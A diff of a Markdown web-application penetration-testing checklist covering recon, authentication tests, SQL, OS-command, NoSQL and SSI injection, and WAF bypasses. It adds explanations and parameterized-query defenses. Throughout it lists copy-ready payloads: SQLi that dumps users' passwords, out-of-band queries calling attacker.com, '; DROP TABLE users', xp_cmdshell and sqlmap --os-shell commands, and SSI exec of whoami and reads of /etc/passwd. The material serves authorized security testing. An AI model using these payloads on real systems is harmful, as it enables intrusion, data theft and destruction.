@@ -1,3 +1,4 @@
+
 # Web Application VAPT Checklist
 
 ---
@@ -56,6 +57,10 @@
 - Check for exposed: `robots.txt`, `sitemap.xml`, `.htaccess`, `<META>` tags, `/.git/`, `/.env/`
 - Probe backup/config extensions: `.old`, `.bak`, `.inc`, `.src`, `.swp`, `~`
 
+#### Security Misconfiguration (Passive)
+- Open directories, default credentials, exposed stack traces
+- Bad CORS due to debug mode, insecure headers, open admin panels
+
 ---
 
 ### 1.2 Active Recon
@@ -89,8 +94,10 @@
   - `linkfinder -i <url> -o cli`
   - `getJS -url <url>`
   - `SecretFinder -i <url>`
+  - `AdminPBuster` — hidden admin panel discovery
   - `arjun -u <url>` — hidden parameter discovery
   - `paramspider -d <domain>`
+  - `kxss` — XSS parameter fuzzing
 
 #### Manual Browsing Targets
 - `/admin`, `/administrator`, `/backoffice`, `/backend`, `/manager/html`
@@ -115,6 +122,9 @@
 - Check OAuth (social login) for `state` parameter presence and validation
 - Test redirect after registration/login for open redirect
 - Check rate limit on account creation
+- **Fuzz after user creation** – check if any folder/file is overwritten or created with your profile name
+- **Lack of confirmation** – try to register with a company email (corporate domain)
+- **Capture integration URL** – attempt integration takeover via leaked OAuth/SSO endpoints
 
 ### 2.2 Login / Credential Testing
 - **Username enumeration:** observe different errors for valid vs. invalid username
@@ -130,6 +140,8 @@
 - After logout, clear cache, visit `/login?next=accounts/profile` — test open redirect
 - Try `/login?next=javascript:alert(1);//` for XSS via redirect
 - Check browser cache weakness (Pragma, Expires, Cache-Control: max-age)
+- **Impersonation function** – test if an admin can impersonate users and if it can be abused
+- **Fail‑open conditions** – test if authentication errors ever allow access (e.g., fallback to anonymous)
 
 ### 2.3 Forgot Password / Reset
 - Check token uniqueness and entropy
@@ -146,6 +158,7 @@
 - No rate limit → send 1000+ requests (OTP/link flooding)
 - Long password (>200 chars) → DoS on reset
 - Response manipulation to bypass reset validation
+- **Use `username@burp_collab.net`** – analyze DNS/HTTP callbacks for token leakage
 
 ### 2.4 OTP Testing
 - Verify OTP is random and not sequential
@@ -191,6 +204,8 @@
 - With privileged user, capture cookie → replay with unprivileged user session
 - CSRF on state-changing requests (missing/bypassable anti-CSRF token)
 - Path traversal in cookie scope
+- **Disclosure of tokens in logs** – check server logs, debug consoles, or error messages for leaked session tokens
+- **Weak generated security questions** – test if security questions are guessable or have a small pool
 
 ---
 
@@ -228,47 +243,54 @@
 
 ### 4.1 SQL Injection
 
-#### Detection
-- Submit `'` → look for SQL syntax errors
-- `' AND 1=1--+` (normal) vs `' AND 1=2--+` (different) → injectable
-- `' OR 1=1--+` → bypass login
-- `' OR 1=1#`
-- `'; WAITFOR DELAY '0:0:5'--` / `' AND SLEEP(5)--` → time-based
-- `' ORDER BY 1--` ... increment until error → determine column count
-- Submit OAST payloads to trigger DNS/HTTP callout
+#### What is SQL Injection?
+- SQLi occurs when user input is directly concatenated into SQL queries without sanitization, allowing attackers to alter query logic.
+- **Impact:** authentication bypass, data theft, data modification, RCE (in some cases).
 
-#### Union-Based Extraction
-```sql
-' ORDER BY N-- -                          -- find column count
-' UNION SELECT NULL,NULL,NULL-- -         -- confirm injectable columns
-' UNION SELECT 1,2,database()-- -         -- get DB name
-' UNION SELECT 1,2,table_name FROM information_schema.tables-- -
-' UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_name='users'-- -
-' UNION SELECT username,password FROM users-- -
-' UNION SELECT username||'~'||password FROM users-- -   -- combine values
-```
+#### Types of SQL Injection
+- **In‑Band (Classic):** Error‑based, Union‑based
+- **Blind:** Boolean‑based, Time‑based
+- **Out‑of‑Band (OOB):** DNS/HTTP exfiltration
+- **Second‑Order:** Payload stored and executed later
 
-#### Error-Based
+#### Detection Steps
+1. Submit single quote `'` → look for SQL syntax errors.
+2. Test boolean conditions: `AND 1=1` vs `AND 1=2` → different responses indicate injection.
+3. Introduce time delays: `SLEEP(5)` or `WAITFOR DELAY '0:0:5'`.
+4. Use OAST payloads (DNS/HTTP) to detect OOB injection.
+5. Determine injection type based on response behaviour.
+
+#### Manual Testing Payloads (by category)
+
+**Error‑Based**
 ```sql
-' AND extractvalue(1,concat(0x7e,database()))-- -          -- MySQL: DB name
-' AND updatexml(1,concat(0x7e,version()),1)-- -            -- MySQL: version
+' AND extractvalue(1,concat(0x7e,database()))-- -          -- MySQL DB name
+' AND updatexml(1,concat(0x7e,version()),1)-- -            -- MySQL version
 ' AND 1=convert(int,@@version)-- -                         -- MSSQL
 ' AND 1=cast(version() as int)-- -                         -- PostgreSQL
 ' AND 1=ctxsys.drithsx.sn(1,(select banner from v$version where rownum=1))-- -  -- Oracle
-' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- -   -- data via CAST error
 ```
 
-#### Boolean-Based Blind
+**Union‑Based**
 ```sql
-' AND 1=1-- -                                                     -- true
-' AND 1=2-- -                                                     -- false
-' AND (SELECT 'a' FROM users LIMIT 1)='a                          -- confirm table exists
-' AND (SELECT 'a' FROM users WHERE username='administrator')='a   -- confirm user
-' AND LENGTH((SELECT password FROM users WHERE username='administrator'))>1-- -
-' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a-- -
+' ORDER BY 1-- - ... ' ORDER BY N-- -                     -- find column count
+' UNION SELECT NULL,NULL,NULL-- -                         -- confirm injectable columns
+' UNION SELECT 1,2,database()-- -                         -- get DB name
+' UNION SELECT 1,2,table_name FROM information_schema.tables-- -
+' UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT username, password FROM users-- -
+' UNION SELECT username||'~'||password FROM users-- -     -- combine values
 ```
 
-#### Time-Based Blind
+**Boolean‑Based Blind**
+```sql
+' AND 1=1-- -                                             -- true (normal page)
+' AND 1=2-- -                                             -- false (different page)
+' AND (SELECT 'a' FROM users LIMIT 1)='a                  -- confirm table exists
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
+```
+
+**Time‑Based Blind**
 ```sql
 -- MySQL
 ' AND IF(1=1, SLEEP(5), 0)-- -
@@ -283,7 +305,7 @@
 ' AND (SELECT dbms_pipe.receive_message('x',5) FROM dual) IS NULL-- -
 ```
 
-#### Out-of-Band (OOB)
+**Out‑of‑Band (OOB)**
 ```sql
 -- MySQL
 ' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\x'))-- -
@@ -293,7 +315,7 @@
 ' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1))=1-- -
 ```
 
-#### Stacked Queries
+**Stacked Queries**
 ```sql
 '; DROP TABLE users-- -
 '; EXEC xp_cmdshell 'dir'-- -                              -- MSSQL RCE
@@ -310,9 +332,16 @@ sqlmap -u "http://target.com/page?id=1" -D dbname -T users --columns
 sqlmap -u "http://target.com/page?id=1" -D dbname -T users -C user,pass --dump
 sqlmap -u "http://target.com/login" --data="user=admin&pass=123" --dump
 sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --os-shell
-# With saved Burp request:
 sqlmap -r request.txt --batch --dbs
 ```
+
+#### Parameterized Queries (Primary Defense)
+- **Concept:** Separate SQL logic from data using placeholders. Database treats parameters as data, never as code.
+- **Examples:**
+  - PHP (PDO): `$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username"); $stmt->execute(['username' => $_POST['username']]);`
+  - Python: `cursor.execute("SELECT * FROM users WHERE username = %s", (username,))`
+  - Java: `PreparedStatement pstmt = conn.prepareStatement("SELECT * FROM users WHERE username = ?"); pstmt.setString(1, username);`
+- **Mitigation:** Always use parameterized queries; never concatenate user input. For dynamic identifiers (table/column names), use whitelisting. Apply least privilege database accounts.
 
 ---
 
@@ -366,17 +395,9 @@ http://foo?&apos;-alert(1)-&apos;
 
 ### 4.3 OS Command Injection
 
-#### Separators (cross-platform)
-```
-&   &&   |   ||
-```
-
-#### Separators (Unix only)
-```
-;   \n (0x0A)
-`injected_command`
-$(injected_command)
-```
+#### Separators
+- **Cross‑platform:** `&`, `&&`, `|`, `||`
+- **Unix only:** `;`, `\n`, backticks `` `cmd` ``, `$(cmd)`
 
 #### Test Payloads
 ```bash
@@ -389,6 +410,7 @@ $(sleep 5)
 `sleep 5`
 ; nslookup attacker.com
 ```
+- **RCE via Referer Header** – inject commands in `Referer: ; whoami`
 
 ---
 
@@ -453,7 +475,7 @@ ${7*7}            → 49 (Freemarker)
 ### 4.7 Other Injections
 
 #### NoSQL Injection
-```
+```json
 {"username": {"$gt": ""}, "password": {"$gt": ""}}
 {"username": {"$regex": ".*"}}
 username[$ne]=invalid&password[$ne]=invalid
@@ -490,6 +512,16 @@ X-Original-URL: /admin
 <h1>Injected</h1>
 <iframe src="http://attacker.com"></iframe>
 ```
+
+#### SOAP Injection – inject XML/SOAP payloads into SOAP endpoints (often via XXE or SQLi in SOAP parameters).
+
+#### SSI Injection (Server‑Side Includes)
+```
+<!--#exec cmd="whoami" -->
+<!--#include file="../../etc/passwd" -->
+```
+
+#### Native Software Flaws (buffer overflow, integer bugs, format strings) – typically out of scope for web VAPT, but note if the web app interacts with native binaries (e.g., image processing, custom protocols).
 
 ---
 
@@ -588,6 +620,7 @@ http://attacker.com/shell.txt  (RFI)
 - Parameter pollution on social media sharing links
 - Change POST to GET for sensitive requests
 - Reuse token, skip steps, act as another user, change action order
+- **Thick‑client components** (Java, ActiveX, Flash) – test for logic bypasses in client‑side binaries
 
 ### 6.2 Business Logic Flaws
 - Cart manipulation, order tampering, coupon stacking
@@ -668,6 +701,7 @@ http://attacker.com/shell.txt  (RFI)
 | Base64 (API params) | `admin' OR '1'='1` → base64 encoded |
 | HTML entities | `<script>` → `&lt;script&gt;` |
 | Unicode tricks | `UNION` → `\u0055NION` |
+| Overlong UTF-8 | `/%2565tc/passwd` (double‑encoded) |
 
 ### SQL WAF Bypass
 ```sql
@@ -747,7 +781,7 @@ jaVaScRiPt:alert(1)
 | SSL/TLS | testssl.sh, sslscan, sslyze |
 | Crawling | waybackurls, gau, hakrawler, gospider |
 | Dir/File Enum | ffuf, dirsearch, gobuster, dirb |
-| Param Discovery | arjun, paramspider |
+| Param Discovery | arjun, paramspider, kxss |
 | SQLi | sqlmap, Burp Intruder |
 | XSS | Burp, kxss, dalfox |
 | JWT | jwt.io, jwt_tool, hashcat |
